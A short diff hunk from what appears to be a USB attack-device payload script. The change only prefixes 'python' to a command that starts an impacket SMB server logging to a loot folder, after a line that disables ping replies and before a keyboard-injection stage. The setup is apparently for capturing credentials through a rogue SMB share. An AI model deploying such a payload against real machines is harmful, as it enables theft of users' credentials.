@@ -53,7 +53,7 @@ echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 
 # Start SMB Server
 mkdir -p /loot
-/tools/impacket/examples/smbserver.py -comment 'Public Share' s /tmp/ > /loot/${LOGFILE} &
+python /tools/impacket/examples/smbserver.py -comment 'Public Share' s /tmp/ > /loot/${LOGFILE} &
 
 # STAGE 1 - HID
 LED STAGE1
